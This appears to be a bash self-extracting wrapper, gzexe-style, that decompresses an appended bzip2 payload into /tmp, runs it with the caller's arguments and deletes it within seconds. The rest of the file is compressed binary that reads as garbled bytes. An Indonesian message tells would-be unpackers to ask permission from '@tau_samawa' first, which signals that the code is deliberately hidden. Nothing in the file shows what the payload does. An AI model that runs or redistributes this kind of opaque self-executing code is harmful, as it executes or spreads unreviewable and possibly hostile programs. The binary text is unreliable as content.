#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY=D�-  �߀@��'�:����PsoP+�E ��Oؓѩ������Q�b4�M<���5OFM     F� s��Ti�` L	�  ������L�<��G�h   ��%0��F���&C��2�� z7���?U�=��G���f�)LR�C���\@�֭�hj,��4%�T�%�|)2��     %4m��NW�Hg���W���B�(hT��B��j��(�#x�_l�J;'Wm���4BkD`�a����M�̦��:~�������ң~A�H��� ضZ
���������������BBBBBf}b6-��\��2�6���g����,g>�h�b>(������w�.��4^r{����Q�]`�?����N(Ho� 4���ZI)�Q�jND�UԐ��S�F�	�M��2�����ʢ������\��p�1�#���?��md�I$����o�r�Dq�ձ�m�B@����9tsjy���ol�� �H��vN<�q�b�#�yo��b�'lÆ�:7�0Ld��-m���:���$$3*�ZP��8��9�n�A��;Tap���Y/iEփ���Q���GMA��#�l#�&Pj{q��	@�֣��0�~�l�����#z<��F����*FR�5Q����74u5�t���ڣPl�I.zTt�I"�{ݹ=M�NFB4w7�,��$�I5��#��`������%0�Z��w$S�	�LB�